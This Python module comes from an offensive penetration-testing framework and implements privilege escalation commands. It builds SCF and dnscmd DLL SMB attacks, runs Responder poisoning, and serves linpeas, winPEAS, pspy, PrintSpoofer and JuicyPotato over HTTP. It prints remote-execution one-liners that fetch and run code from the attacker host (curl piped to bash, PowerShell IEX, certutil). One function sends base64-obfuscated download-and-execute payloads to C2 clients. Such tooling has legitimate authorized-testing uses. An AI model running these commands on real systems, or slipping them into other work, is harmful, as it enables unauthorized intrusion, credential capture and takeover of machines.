"""Privilege Escalation command set.

Pending phase module covering local privilege escalation helpers:
SMB relay setup, Responder, linpeas / winpeas / pspy serving, kernel
exploit suggestion (LES), SUID enumeration, GTFOBins / LOLBas lookup and
the ``sudo`` re-launch helper.

Pending status: this set inherits from
:class:`cli.commands._dormancy.PendingCommandSet`, so it is discovered for
test coverage but not registered onto the shell while ``LazyOwnShell``
still defines the original methods. Promote it to
:class:`cli.commands._base.LazyOwnCommandSet` once the legacy copies are
deleted from ``lazyown.py``.
"""

from __future__ import annotations

import base64
import json
import os
import shutil

import cmd2

from cli.commands._base import LazyOwnCommandSet
from utils import (
    GREEN,
    WHITE,
    check_lhost,
    check_sudo,
    copy2clip,
    is_binary_present,
    print_error,
    print_msg,
    print_warn,
    privilege_escalation_category,
)

SESSIONS_DIRECTORY_NAME = "sessions"
SCF_FILE_NAME = "file.scf"
DEFAULT_SMB_FOLDER = "smbfolder"
DEFAULT_HTTP_LPORT = 1337
EXECUTABLE_FILE_MODE = 0o755

SMB_CHOICE_SCF = "1"
SMB_CHOICE_DNSCMD = "2"
SMB_CHOICE_GUEST_AUTH = "3"
SMB_DEFAULT_CHOICE = SMB_CHOICE_DNSCMD

RESPONDER_INSTALL_COMMAND = "sudo apt install responder python-aioquic -y"

LINPEAS_FILE_NAME = "linpeas.sh"
LINPEAS_SMALL_FILE_NAME = "linpeas_small.sh"
LINPEAS_SMALL_FLAG = "small"
LINPEAS_CANDIDATES = (
    "/usr/share/peass/linpeas/{name}",
    "external/.exploit/privilege-escalation-awesome-scripts-suite/linPEAS/{name}",
    "external/{name}",
)
LINPEAS_INSTALL_HINT = "Install with: sudo apt install peass"

WINPEAS_VARIANTS = {
    "x86": "winPEASx86.exe",
    "bat": "winPEAS.bat",
    "ps1": "winPEAS.ps1",
    "any": "winPEASany.exe",
}
WINPEAS_DEFAULT = "winPEASx64.exe"
WINPEAS_SHARE_DIR = "/usr/share/peass/winpeas"
WINPEAS_INSTALL_HINT = "Install: sudo apt install peass"

LES_CANDIDATES = (
    "external/.exploit/linux-exploit-suggester/linux-exploit-suggester.sh",
    "/usr/share/les/linux-exploit-suggester.sh",
)
LES_INSTALL_HINT = (
    "Install: git clone https://github.com/mzet-/linux-exploit-suggester external/.exploit/linux-exploit-suggester"
)
OS_JSON_FILENAME = "os.json"
OS_KERNEL_KEYS = ("kernel", "uname")

PSPY_DEFAULT_ARCH = "64"
PSPY_ALTERNATE_ARCH = "32"
PSPY_CANDIDATES = (
    "external/.exploit/pspy/{name}",
    "/usr/local/bin/{name}",
    "/opt/{name}",
)
PSPY_INSTALL_HINT = "Download from: https://github.com/DominicBreuker/pspy/releases"

GTFO_PARQUETS_DIRECTORY = "parquets"
GTFO_GTFOBINS_FILE = "detalles.parquet"
GTFO_LOLBAS_FILE = "lolbas_details.parquet"
GTFO_BINARY_COLUMN = "Binary"
GTFO_DESCRIPTION_PREVIEW = 80
GTFO_EXAMPLE_PREVIEW = 120
GTFO_PANDAS_HINT = "pandas required for gtfo: pip install pandas pyarrow"
GTFO_ONLINE_REFERENCE = "Check online: https://gtfobins.github.io/"


def _sessions_directory(base_path: str) -> str:
    """Return the absolute path to the per-shell ``sessions/`` directory.

    Args:
        base_path: Shell ``self.path`` (the repository working directory).

    Returns:
        Absolute path of ``<base_path>/sessions``.
    """
    return os.path.join(base_path, SESSIONS_DIRECTORY_NAME)


def _serve_via_http(shell, binary_name: str, sessions_path: str, lport: int) -> None:
    """Spawn a background HTTP server rooted at ``sessions_path``.

    Args:
        shell: The bound shell exposing ``cmd``.
        binary_name: Filename being announced. Used only for log clarity.
        sessions_path: Directory served by the HTTP server.
        lport: Listening port copied from ``payload.json``.
    """
    del binary_name
    shell.cmd(f"python3 -m http.server {lport} --directory {sessions_path} &")


class PrivilegeEscalationCommandSet(LazyOwnCommandSet):
    """Pending phase module for the Privilege Escalation commands."""

    phase = "privesc"
    category = privilege_escalation_category

    @cmd2.with_category(privilege_escalation_category)
    def do_smbserver(self, line):
        """Stand up an Impacket SMB server with three relay variants.

        Variant 1 generates an SCF file under ``sessions/file.scf`` that
        triggers SMB auth from victims browsing the share. Variant 2
        copies a ``dnscmd`` DLL load one-liner for DA pivoting. Variant 3
        publishes the share with ``guest`` credentials for blind file
        drops.

        Args:
            line: Optional share folder name. Defaults to
                :data:`DEFAULT_SMB_FOLDER`.

        Returns:
            None.
        """
        folder = line if line else DEFAULT_SMB_FOLDER
        lhost = self.params["lhost"]
        if not check_lhost(lhost):
            return
        prompt = (
            f"    [!] Enter your choice {GREEN}1) {WHITE}to file.scf attack, "
            f"{GREEN}2){WHITE} to dnscmd dll attack or "
            f"{GREEN}3) simple server with username (default: {SMB_DEFAULT_CHOICE})"
        )
        choice = input(prompt) or SMB_DEFAULT_CHOICE
        if choice == SMB_CHOICE_SCF:
            revshell = (
                f"[Shell]\nCommand=2\nIconFile=\\\\\\\\{lhost}\\{folder}\\icon.ico\n[Taskbar]\nCommand=ToggleDesktop\n"
            )
            scf_path = os.path.join(SESSIONS_DIRECTORY_NAME, SCF_FILE_NAME)
            print_msg(f"Try... echo '{revshell}' > {scf_path} ")
            self.cmd(f"echo '{revshell}' > {scf_path} ")
            print_msg(f"echo 'curl http://{lhost}/{SCF_FILE_NAME}' |  xclip -sel clip")
            print_msg("command copied to clipboard")
            print_msg(f"trying sudo impacket-smbserver {folder} $(pwd) -smb2support ...")
            self.cmd(f"echo 'curl http://{lhost}/{SCF_FILE_NAME} -o {SCF_FILE_NAME}' |  xclip -sel clip")
            self.cmd(f"cd {SESSIONS_DIRECTORY_NAME} && sudo impacket-smbserver {folder} $(pwd) -smb2support")
        elif choice == SMB_CHOICE_DNSCMD:
            command = f"cd {SESSIONS_DIRECTORY_NAME} && sudo impacket-smbserver {folder} $(pwd) -smb2support"
            print_msg(command)
            attack = f"cmd /c dnscmd localhost /config /serverlevelplugindll \\{lhost}\\{folder}\\da.dll"
            copy2clip(attack)
            self.cmd(command)
        elif choice == SMB_CHOICE_GUEST_AUTH:
            command = (
                f"cd {SESSIONS_DIRECTORY_NAME} && "
                f"sudo impacket-smbserver -username guest -password guest "
                f"{folder} $(pwd) -smb2support"
            )
            print_msg(command)
            attack = f"net use x: \\\\{lhost}\\{folder} /user:guest guest"
            copy2clip(attack)
            self.cmd(command)
        else:
            print_error("wrong choice (1/2)")

    @cmd2.with_category(privilege_escalation_category)
    def do_responder(self, line):
        """Run Responder on the configured ``device`` with elevated privileges.

        Installs the package via ``apt`` when the binary is missing, then
        invokes ``sudo responder -I <device> -w On`` so SMB/LLMNR/NBNS
        poisoning starts immediately.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        device = self.params["device"]
        if not device:
            print_error("Device must be assign use assign device <network_device_ex_tun0>")
            return
        if not is_binary_present("responder"):
            print_warn("Responder not found installing...")
            self.cmd(RESPONDER_INSTALL_COMMAND)
        print_msg(f"Try sudo responder -I {device} -w On ")
        self.cmd(f"sudo responder -I {device} -w On ")

    @cmd2.with_category(privilege_escalation_category)
    def do_sudo(self, line):
        """Re-launch the framework with root privileges when missing.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        check_sudo()

    @cmd2.with_category(privilege_escalation_category)
    def do_linpeas(self, line):
        """Serve ``linpeas.sh`` over HTTP and print the target one-liner.

        Searches the configured candidates for the script, copies it
        into ``sessions/`` and spawns a background HTTP server bound to
        ``lhost:lport`` so the compromised host can pull and execute it.

        Args:
            line: Optional ``small`` flag to switch to ``linpeas_small.sh``.

        Returns:
            None.
        """
        lhost = self.params.get("lhost") or ""
        lport = self.params.get("lport", DEFAULT_HTTP_LPORT)
        if not check_lhost(lhost):
            return
        small = LINPEAS_SMALL_FLAG in (line or "").lower()
        fname = LINPEAS_SMALL_FILE_NAME if small else LINPEAS_FILE_NAME
        candidates = [template.format(name=fname) for template in LINPEAS_CANDIDATES]
        source = next((p for p in candidates if os.path.isfile(p)), None)
        if not source:
            print_error(f"{fname} not found. {LINPEAS_INSTALL_HINT}")
            return
        sessions_path = _sessions_directory(self.path)
        destination = os.path.join(sessions_path, fname)
        if not os.path.exists(destination):
            os.makedirs(sessions_path, exist_ok=True)
            shutil.copy2(source, destination)
        print_msg(f"Serving {fname} from sessions/ on http://{lhost}:{lport}")
        print_msg("Run on target (Linux):")
        print_msg(f"  curl -s http://{lhost}:{lport}/{fname} | bash")
        print_msg(f"  wget -qO- http://{lhost}:{lport}/{fname} | bash")
        _serve_via_http(self, fname, sessions_path, lport)

    @cmd2.with_category(privilege_escalation_category)
    def do_winpeas(self, line):
        """Serve a winPEAS variant over HTTP and print the target one-liner.

        Selects the variant by argument: default x64, ``x86`` for 32-bit,
        ``bat`` for the batch script (no AV evasion), ``ps1`` for the
        PowerShell port, or ``any`` for the merged binary.

        Args:
            line: Variant selector. Empty defaults to :data:`WINPEAS_DEFAULT`.

        Returns:
            None.
        """
        lhost = self.params.get("lhost") or ""
        lport = self.params.get("lport", DEFAULT_HTTP_LPORT)
        if not check_lhost(lhost):
            return
        argument = (line or "").lower().strip()
        fname = WINPEAS_VARIANTS.get(argument, WINPEAS_DEFAULT)
        source = os.path.join(WINPEAS_SHARE_DIR, fname)
        if not os.path.isfile(source):
            print_error(f"{fname} not found at {source}. {WINPEAS_INSTALL_HINT}")
            return
        sessions_path = _sessions_directory(self.path)
        destination = os.path.join(sessions_path, fname)
        if not os.path.exists(destination):
            shutil.copy2(source, destination)
        print_msg(f"Serving {fname} via http://{lhost}:{lport}")
        if fname.endswith(".ps1") or fname.endswith(".bat"):
            print_msg("Run on target (PowerShell):")
            print_msg(f'  IEX(New-Object Net.WebClient).DownloadString("http://{lhost}:{lport}/{fname}")')
        else:
            print_msg("Run on target (PowerShell):")
            print_msg(
                f'  certutil -urlcache -split -f "http://{lhost}:{lport}/{fname}" %TEMP%\\wp.exe && %TEMP%\\wp.exe'
            )
        _serve_via_http(self, fname, sessions_path, lport)

    @cmd2.with_category(privilege_escalation_category)
    def do_les(self, line):
        """Run Linux Exploit Suggester against a kernel version.

        When no version is supplied, attempts to read it from
        ``sessions/os.json``. Falls back to a warning when the kernel
        cannot be determined.

        Args:
            line: Optional explicit kernel version (``uname -r`` output).

        Returns:
            None.
        """
        kernel = (line or "").strip()
        if not kernel:
            os_data: dict = {}
            os_json_path = os.path.join(_sessions_directory(self.path), OS_JSON_FILENAME)
            if os.path.isfile(os_json_path):
                try:
                    with open(os_json_path, encoding="utf-8") as handle:
                        os_data = json.load(handle)
                except (OSError, json.JSONDecodeError):
                    os_data = {}
            for key in OS_KERNEL_KEYS:
                value = os_data.get(key)
                if value:
                    kernel = value
                    break
        if not kernel:
            print_warn("Kernel version unknown. Run 'uname -r' on the target and pass it: les <kernel>")
            return
        les_script = next((p for p in LES_CANDIDATES if os.path.isfile(p)), None)
        if not les_script:
            print_error("linux-exploit-suggester not found.")
            print_msg(LES_INSTALL_HINT)
            return
        print_msg(f"Running linux-exploit-suggester for kernel: {kernel}")
        self.cmd(f"bash {les_script} --uname '{kernel}'")

    @cmd2.with_category(privilege_escalation_category)
    def do_suid_check(self, line):
        """Print SUID/SGID enumeration commands ready to paste on the target.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        print_msg("Paste on target to find SUID/SGID binaries:")
        print_msg("  find / -perm -4000 -type f 2>/dev/null")
        print_msg("  find / -perm -2000 -type f 2>/dev/null")
        print_msg("  find / \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null")
        print_msg("")
        print_msg("Then look up each result: gtfo <binary>")
        print_msg("Or run linpeas for automated enumeration: linpeas")

    @cmd2.with_category(privilege_escalation_category)
    def do_pspy(self, line):
        """Serve the ``pspy`` process monitor over HTTP.

        Args:
            line: ``32`` to serve ``pspy32``; anything else serves
                ``pspy64``.

        Returns:
            None.
        """
        lhost = self.params.get("lhost") or ""
        lport = self.params.get("lport", DEFAULT_HTTP_LPORT)
        if not check_lhost(lhost):
            return
        arch = PSPY_ALTERNATE_ARCH if PSPY_ALTERNATE_ARCH in (line or "") else PSPY_DEFAULT_ARCH
        fname = f"pspy{arch}"
        candidates = [template.format(name=fname) for template in PSPY_CANDIDATES]
        source = next((p for p in candidates if os.path.isfile(p)), None)
        if not source:
            print_error(f"{fname} not found.")
            print_msg(PSPY_INSTALL_HINT)
            print_msg(f"Then place at: external/.exploit/pspy/{fname}")
            return
        sessions_path = _sessions_directory(self.path)
        destination = os.path.join(sessions_path, fname)
        if not os.path.exists(destination):
            shutil.copy2(source, destination)
            os.chmod(destination, EXECUTABLE_FILE_MODE)
        print_msg(f"Serving {fname} via http://{lhost}:{lport}")
        print_msg("Run on target:")
        print_msg(f"  wget http://{lhost}:{lport}/{fname} -O /tmp/{fname} && chmod +x /tmp/{fname} && /tmp/{fname}")
        _serve_via_http(self, fname, sessions_path, lport)

    @cmd2.with_category(privilege_escalation_category)
    def do_gtfo(self, line):
        """Look up a binary in GTFOBins and LOLBas parquet knowledge bases.

        Args:
            line: Binary name to search (case-insensitive). Empty input
                emits a usage error.

        Returns:
            None.
        """
        binary = (line or "").strip().lower()
        if not binary:
            print_error("Usage: gtfo <binary>  e.g. gtfo sudo")
            return
        try:
            import pandas
        except ImportError:
            print_error(GTFO_PANDAS_HINT)
            return
        parquets_path = os.path.join(self.path, GTFO_PARQUETS_DIRECTORY)
        sources = (
            ("GTFOBins", os.path.join(parquets_path, GTFO_GTFOBINS_FILE)),
            ("LOLBas", os.path.join(parquets_path, GTFO_LOLBAS_FILE)),
        )
        found = False
        for label, parquet_path in sources:
            if not os.path.isfile(parquet_path):
                continue
            frame = pandas.read_parquet(parquet_path)
            mask = frame[GTFO_BINARY_COLUMN].str.lower() == binary
            hits = frame[mask]
            if hits.empty:
                continue
            found = True
            print_msg(f"{label} - {binary}")
            for _, row in hits.iterrows():
                function_name = row.get("Function Name", "")
                description = str(row.get("Description", ""))[:GTFO_DESCRIPTION_PREVIEW]
                print_msg(f"  [{function_name}] {description}")
                example = str(row.get("Example", "")).strip()
                if example and example != "nan":
                    print_msg(f"    {example[:GTFO_EXAMPLE_PREVIEW]}")
        if not found:
            print_warn(f"'{binary}' not found in GTFOBins or LOLBas.")
            print_msg(GTFO_ONLINE_REFERENCE)

    @cmd2.with_category(privilege_escalation_category)
    def do_whoami_priv(self, line):
        """Print privilege enumeration commands for the target OS.

        Detects the target OS from ``payload.json`` or ``sessions/os.json``
        and prints a ready-to-paste set of commands that reveal the current
        user's privileges, group memberships, and dangerous tokens.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        os_id = self.params.get("os_id", "")
        if not os_id:
            os_json_path = os.path.join(_sessions_directory(self.path), OS_JSON_FILENAME)
            if os.path.isfile(os_json_path):
                try:
                    with open(os_json_path, encoding="utf-8") as handle:
                        os_data = json.load(handle)
                    if isinstance(os_data, list) and os_data:
                        os_id = str(os_data[0].get("id", ""))
                except (OSError, json.JSONDecodeError):
                    pass
        if os_id == "2":
            self._whoami_priv_windows()
            return
        self._whoami_priv_linux()

    def _whoami_priv_linux(self):
        """Print Linux privilege enumeration commands."""
        print_msg("Paste on target to enumerate Linux privileges:")
        print_msg("  id")
        print_msg("  sudo -l 2>/dev/null")
        print_msg("  getcap -r / 2>/dev/null")
        print_msg("  find / -perm -4000 -type f 2>/dev/null")
        print_msg("  find / -perm -2000 -type f 2>/dev/null")
        print_msg("  groups")
        print_msg("  cat /etc/crontab 2>/dev/null")
        print_msg("  ls -la /etc/cron.* 2>/dev/null")
        print_msg("  ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
        print_msg("")
        print_msg("Then analyse the output with crystal_ball --auto")
        print_msg("or look up sudo binaries with: gtfo <binary>")

    def _whoami_priv_windows(self):
        """Print Windows privilege enumeration commands."""
        print_msg("Paste on target to enumerate Windows privileges:")
        print_msg("  whoami /priv")
        print_msg("  whoami /groups")
        print_msg("  whoami /all")
        print_msg("  net user %USERNAME%")
        print_msg("  icacls C:\\* 2>nul")
        print_msg("  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated")
        print_msg("  wmic service get name,displayname,pathname,startmode | findstr /i auto")
        print_msg("  schtasks /query /fo LIST /v")
        print_msg("  netstat -ano | findstr LISTENING")
        print_msg("")
        print_msg("Then analyse the output with crystal_ball --auto")

    @cmd2.with_category(privilege_escalation_category)
    def do_sudo_privesc(self, line):
        """Analyse sudo -l output and cross-reference with GTFOBins.

        Reads sudo -l output from a session file or command argument and
        identifies binaries with documented privilege escalation bypasses
        from the GTFOBins parquet knowledge base.

        Args:
            line: Optional path to a file containing sudo -l output.
                When empty, attempts to read from the last session report.

        Returns:
            None.
        """
        sudo_output = ""
        target = (line or "").strip()
        if target and os.path.isfile(target):
            try:
                with open(target, encoding="utf-8", errors="ignore") as handle:
                    sudo_output = handle.read()
            except OSError:
                print_error(f"Cannot read {target}")
                return
        if not sudo_output:
            session_csv = os.path.join(_sessions_directory(self.path), "LazyOwn_session_report.csv")
            if os.path.isfile(session_csv):
                try:
                    import csv

                    with open(session_csv, encoding="utf-8", errors="ignore") as handle:
                        for row in csv.DictReader(handle):
                            out = row.get("output", "")
                            if "sudo" in out.lower() or "NOPASSWD" in out:
                                sudo_output += out + "\n"
                except Exception:
                    pass
        if not sudo_output:
            print_msg("Usage: sudo_privesc <file_with_sudo_minus_l_output>")
            print_msg("First run 'sudo -l' on the target and save the output to a file.")
            print_msg("Or pass output via a session file.")
            return
        import os as _os
        import re

        sudo_binaries: list[str] = []
        patterns = [
            r"\(\S+\)\s+NOPASSWD:\s*(\S+)",
            r"\(\S+:\S+\)\s+NOPASSWD:\s*(\S+)",
            r"\(\S+\)\s+(\S+)",
            r"\(\S+:\S+\)\s+(\S+)",
            r"NOPASSWD:\s*(\S+)",
        ]
        for pattern in patterns:
            for match in re.finditer(pattern, sudo_output):
                binary_path = match.group(1).strip()
                binary_name = _os.path.basename(binary_path).strip()
                if binary_name and binary_name not in sudo_binaries:
                    sudo_binaries.append(binary_name)
        if not sudo_binaries:
            print_msg("No sudo-allowed binaries detected in output.")
            return
        print_msg(f"Detected {len(sudo_binaries)} sudo-allowed binaries:")
        for b in sorted(sudo_binaries):
            print_msg(f"  {b}")
        print_msg("")
        try:
            import pandas
        except ImportError:
            print_error("pandas required: pip install pandas pyarrow")
            return
        parquet_path = os.path.join(self.path, GTFO_PARQUETS_DIRECTORY, GTFO_GTFOBINS_FILE)
        if not os.path.isfile(parquet_path):
            print_error(f"GTFOBins parquet not found at {parquet_path}")
            print_msg(GTFO_ONLINE_REFERENCE)
            return
        frame = pandas.read_parquet(parquet_path)
        print_msg("GTFOBins sudo matches:")
        found = 0
        for b in sorted(sudo_binaries):
            mask = frame[GTFO_BINARY_COLUMN].str.lower() == b.lower()
            hits = frame[mask]
            if hits.empty:
                continue
            found += 1
            for _, row in hits.iterrows():
                function_name = row.get("Function Name", "")
                sudo_row = str(row.get("SUID", "")) or str(row.get("Sudo", ""))
                description = str(row.get("Description", ""))[:GTFO_DESCRIPTION_PREVIEW]
                print_msg(f"  [{b}] {function_name} | {description}")
                if sudo_row and sudo_row != "nan":
                    print_msg(f"    {sudo_row[:GTFO_EXAMPLE_PREVIEW]}")
        if not found:
            print_warn("None of the detected binaries matched GTFOBins entries.")
            print_msg(GTFO_ONLINE_REFERENCE)
        else:
            print_msg(f"\n{found} binary(s) have documented sudo privesc vectors.")

    @cmd2.with_category(privilege_escalation_category)
    def do_printspoofer(self, line):
        """Serve PrintSpoofer over HTTP for Windows privilege escalation.

        Searches for ``PrintSpoofer64.exe`` in configured directories,
        copies it to ``sessions/`` and serves it via HTTP. Prints the
        target one-liner for download + execution.

        Args:
            line: Unused.

        Returns:
            None.
        """
        del line
        return self._serve_windows_tool(
            "PrintSpoofer64.exe",
            "PrintSpoofer",
            "Impersonate SYSTEM via SeImpersonatePrivilege",
            "\\\\localhost\\pipe\\spoolss",
        )

    @cmd2.with_category(privilege_escalation_category)
    def do_juicypotato(self, line):
        """Serve JuicyPotato over HTTP for Windows privilege escalation.

        Searches for ``JuicyPotato.exe`` in configured directories,
        copies it to ``sessions/`` and serves it via HTTP. Prints the
        target one-liner for download + execution.

        Args:
            line: Optional CLSID for the potato attack. Defaults to
                the BITS CLSID when omitted.

        Returns:
            None.
        """
        clsid = (line or "").strip()
        default_clsid = "{4991d34b-80a1-4291-83b6-3328366b9097}"
        use_clsid = clsid if clsid and clsid.startswith("{") else default_clsid
        self._serve_windows_tool(
            "JuicyPotato.exe",
            "JuicyPotato",
            "Impersonate SYSTEM via SeImpersonatePrivilege (potato)",
            f" -t * -p C:\\\\Windows\\\\System32\\\\cmd.exe -l 1337 -c {use_clsid}",
        )

    def _serve_windows_tool(self, binary: str, label: str, description: str, args: str) -> None:
        """Serve a Windows privilege escalation binary over HTTP.

        Args:
            binary: Filename to search for and serve.
            label: Human-readable tool name for log messages.
            description: One-line description of the technique.
            args: Additional CLI arguments for the tool on the target.

        Returns:
            None.
        """
        lhost = self.params.get("lhost") or ""
        lport = self.params.get("lport", DEFAULT_HTTP_LPORT)
        if not check_lhost(lhost):
            return
        candidates = (
            os.path.join("external", ".exploit", binary),
            os.path.join("external", binary),
            os.path.join("/usr", "share", "lazyown", binary),
            os.path.join("/opt", binary),
        )
        source = next((p for p in candidates if os.path.isfile(p)), None)
        if not source:
            print_error(f"{binary} not found. Place it under external/ or install peass.")
            print_msg(f"{label}: {description}")
            return
        sessions_path = _sessions_directory(self.path)
        destination = os.path.join(sessions_path, binary)
        if not os.path.exists(destination):
            os.makedirs(sessions_path, exist_ok=True)
            shutil.copy2(source, destination)
        print_msg(f"Serving {label} via http://{lhost}:{lport}/{binary}")
        print_msg(f"{label}: {description}")
        print_msg("Run on target (cmd.exe as low-priv user):")
        print_msg(f'  certutil -urlcache -split -f "http://{lhost}:{lport}/{binary}" %TEMP%\\{binary}')
        print_msg(f"  %TEMP%\\{binary}{args}")
        _serve_via_http(self, binary, sessions_path, lport)

    def _detect_os_for_privesc(self) -> str:
        """Detect the target OS from world_model.json or sessions/os.json.

        Checks the world model first for the host matching ``rhost``, then
        falls back to ``sessions/os.json``.

        Returns:
            ``"linux"``, ``"windows"``, or ``""`` if unknown.
        """
        rhost = self.params.get("rhost") or ""

        sessions_path = _sessions_directory(self.path)
        wm_path = os.path.join(sessions_path, "world_model.json")
        if rhost and os.path.isfile(wm_path):
            try:
                with open(wm_path, encoding="utf-8") as handle:
                    wm = json.load(handle)
                hosts = wm.get("hosts", {})
                host = hosts.get(rhost, {})
                os_hint = (host.get("os_hint") or "").lower()
                if os_hint:
                    if "windows" in os_hint or "win" in os_hint:
                        return "windows"
                    if "linux" in os_hint or "unix" in os_hint:
                        return "linux"
                    return os_hint
                for _ip, _h in hosts.items():
                    _hint = (_h.get("os_hint") or "").lower()
                    if "windows" in _hint or "win" in _hint:
                        return "windows"
                    if "linux" in _hint or "unix" in _hint:
                        return "linux"
                    if _hint:
                        return _hint
            except (OSError, json.JSONDecodeError):
                pass

        os_json_path = os.path.join(sessions_path, OS_JSON_FILENAME)
        if os.path.isfile(os_json_path):
            try:
                with open(os_json_path, encoding="utf-8") as handle:
                    os_data = json.load(handle)
                if isinstance(os_data, list) and os_data:
                    os_name = (os_data[0].get("os") or "").lower()
                    if "linux" in os_name:
                        return "linux"
                    if "windows" in os_name:
                        return "windows"
                    os_id = str(os_data[0].get("id", ""))
                    if os_id == "2":
                        return "linux"
                    if os_id == "1":
                        return "windows"
            except (OSError, json.JSONDecodeError):
                pass

        return ""

    @cmd2.with_category(privilege_escalation_category)
    def do_privesc_cmd_by_os(self, line):
        """Prepare and send a linpeas/winpeas command to a C2 client.

        Detects the target OS from the world model or ``os.json``, builds a
        ofuscated (base64) curl|bash one-liner via ``ofuscate_payload`` and
        sends it to the specified C2 client via ``issue_command_to_c2``.

        Args:
            line: ``<client_id> [--small]``

        Returns:
            None
        """
        parts = (line or "").strip().split()
        if not parts:
            print_error("Usage: privesc_cmd_by_os <client_id> [--small]")
            return

        client_id = parts[0]
        flags = parts[1:] if len(parts) > 1 else []
        use_small = "--small" in flags

        platform = self._detect_os_for_privesc()
        if not platform:
            print_warn("OS not detected from world_model or os.json. Defaulting to Linux.")
            platform = "linux"

        print_msg(f"Detected OS: {platform}")

        lhost = self.params.get("lhost") or ""
        lport = self.params.get("lport", str(DEFAULT_HTTP_LPORT))

        if platform == "linux":
            fname = LINPEAS_SMALL_FILE_NAME if use_small else LINPEAS_FILE_NAME
            payload = f"curl -s http://{lhost}:{lport}/{fname} | bash"
        else:
            variant = WINPEAS_VARIANTS.get("ps1", "winPEAS.ps1")
            payload = f"iex(iwr -Uri 'http://{lhost}:{lport}/{variant}' -UseBasicParsing).Content"

        b64_payload = base64.b64encode(payload.encode()).decode()

        if platform == "linux":
            final_cmd = f"echo '{b64_payload}' | base64 -d | bash"
        else:
            final_cmd = (
                f'powershell -c "[System.Text.Encoding]::UTF8.GetString('
                f"[System.Convert]::FromBase64String('{b64_payload}')) | iex\""
            )

        print_msg(f"Issuing privesc command to client {client_id}:")
        print_msg(f"  {final_cmd[:160]}...")
        self.issue_command_to_c2(final_cmd, client_id)


__all__ = ["PrivilegeEscalationCommandSet"]
